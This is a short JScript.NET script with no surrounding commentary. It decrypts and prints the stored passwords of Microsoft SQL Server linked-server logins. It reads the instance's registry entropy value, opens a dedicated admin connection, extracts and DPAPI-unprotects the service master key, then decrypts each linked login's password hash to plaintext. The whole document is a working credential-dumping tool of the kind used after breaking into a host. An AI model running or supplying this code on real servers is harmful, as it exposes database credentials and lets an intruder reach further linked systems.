import System
import System.Text
import System.IO
import System.Security.Cryptography
import Microsoft.Win32
import System.Reflection
import System.Data.SqlClient
import System.Data


var instNames=Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server","InstalledInstances",null);
if(instNames==null){print("can not enum instances");Environment.Exit(0);}
for(var i in instNames)
{
    print(String.Format("========result of instance: {0}========",instNames[i]))
    try{
        var regpath=Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\sql",instNames[i],null)
        var regkey=Registry.GetValue(String.Format("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\{0}\\Security",regpath),"Entropy",null)
        if(regkey==null){throw("can not get regkey");}
        var conn:SqlConnection=new SqlConnection(String.Format("Server=ADMIN:{0}\\{1};Trusted_Connection=True",Environment.MachineName,instNames[i]=="MSSQLSERVER"?"":instNames[i]))
        try{conn.Open();}
        catch(e){throw ("can not open connection: "+e.message);}
        var sqlkey=new SqlCommand("SELECT substring(crypt_property,9,DATALENGTH(crypt_property)-8) FROM sys.key_encryptions WHERE key_id=102 and (thumbprint=0x03 or thumbprint=0x0300000001)",conn).ExecuteScalar()
        var decedkey=ProtectedData.Unprotect(sqlkey,regkey,"LocalMachine");
        var decprd:SymmetricAlgorithm=null;var ivlen=8;
        if(decedkey.length==16)
        {decprd=new TripleDESCryptoServiceProvider();}
        else if(decedkey.length==32)
        {decprd=Rijndael.Create();decprd.BlockSize=128;decprd.KeySize=256;ivlen=16; }
        else{throw "key type not supported";}
        var dt:DataTable=new DataTable();
        new SqlDataAdapter("SELECT b.srvname,b.srvproduct,b.providername,b.datasource,b.location,b.providerstring,b.catalog,a.name,a.pwdhash FROM master.sys.syslnklgns a inner join master.sys.sysservers b on a.srvid=b.srvid WHERE DATALENGTH(pwdhash)>0",conn).Fill(dt);
        for(var dr in dt.Rows)
        {
            var iv=byte[](dr["pwdhash"]).slice(4,ivlen+4);
            var encedpwd=byte[](dr["pwdhash"]).slice(ivlen+4);
            var mem:MemoryStream=new MemoryStream();
            var cs:CryptoStream=new CryptoStream(mem,decprd.CreateDecryptor(decedkey,iv),"Write")
            cs.Write(encedpwd,0,encedpwd.length);
            cs.FlushFinalBlock()
            print(String.Format("server:{0}\r\nproduct:{1}\r\nprovider:{2}\r\nsource:{3}\r\nlocation:{4}\r\nprovstr:{5}\r\ncatalog:{6}\r\nusername:{7}\r\npassword:{8}\r\n",dr[0],dr[1],dr[2],dr[3],dr[4],dr[5],dr[6],dr[7],Encoding.Unicode.GetString(mem.ToArray().slice(8))))
        }
        conn.Close();
    }catch(e){print(e);}
}















